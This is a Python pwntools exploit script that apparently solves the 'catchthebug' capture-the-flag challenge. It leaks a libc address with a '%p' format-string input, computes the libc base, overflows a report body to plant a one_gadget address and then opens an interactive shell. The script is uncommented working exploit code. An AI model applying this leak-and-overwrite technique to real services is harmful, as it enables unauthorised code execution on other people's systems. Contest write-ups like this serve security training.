#!/usr/bin/env python
from pwn import *

def catch(name):
    while True:
        s.sendlineafter('>> ', '1')
        s.recvline()
        if s.recvline(False) == 'There is no bug =(':
            continue
        s.sendafter('>> ', name)
        break

def inspect(num):
    s.sendlineafter('>> ', '2')
    ret = []
    for i in range(num):
        s.recvuntil('==\n')
        ret.append((s.recvline(False), len(s.recvuntil('=')) - 2))
    return ret

def submit(title = 'A' * 0x40, subtitle = 'A' * 0x80, body = 'A' * 0x100, tag = 'A' * 8, password = 'A' * 8):
    s.sendlineafter('>> ', '3')
    s.sendafter('title\n', title)
    s.sendafter('subtitle\n', subtitle)
    if len(body) < 0x100:
        body += '\n'
    s.sendafter('body\n', body)
    if len(tag) < 8:
        tag += '\n'
    s.sendafter('tag\n', tag)
    s.sendafter('password\n', password)

if __name__ == '__main__':
    # context.log_level = 'DEBUG'
    if len(sys.argv) == 1:
        s = process('./bug_3e99623da36874fd424a4e237866e301d292aa66')
        # s = process('./bug_3e99623da36874fd424a4e237866e301d292aa66', env = {'LD_PRELOAD': './libc-2.26.so_cc8df6278e095fcc4ca8a98e1f1c69c04db30a4c'})
    else:
        s = remote('catchthebug.eatpwnnosleep.com', 55555)

    libc = ELF('./libc-2.26.so_cc8df6278e095fcc4ca8a98e1f1c69c04db30a4c')
    one_gadgets = [0x47c46, 0x47c9a, 0xfccde, 0xfdb8e]

    catch('%p\n')
    catch('AAAA')
    catch('AAAA')
    res = inspect(3)
    libc_base = int(res[0][0], 16) - libc.symbols['_IO_2_1_stdout_'] - 131
    log.info('libc base: %#x' % libc_base)
    length = 8 * 3 + sum([l for _, l in res]) + 0x40 + 0x80
    log.info('report length: %#x' % length)
    if length < 0x618:
        print 'try again'
        exit(0)
    body = 'A' * (0x708 - length)
    body += p64(libc_base + 0x608040 + 3840 - len(body) - 0x9)
    tag = p64(libc_base + one_gadgets[2])
    submit(body = body, tag = tag)
    s.interactive()
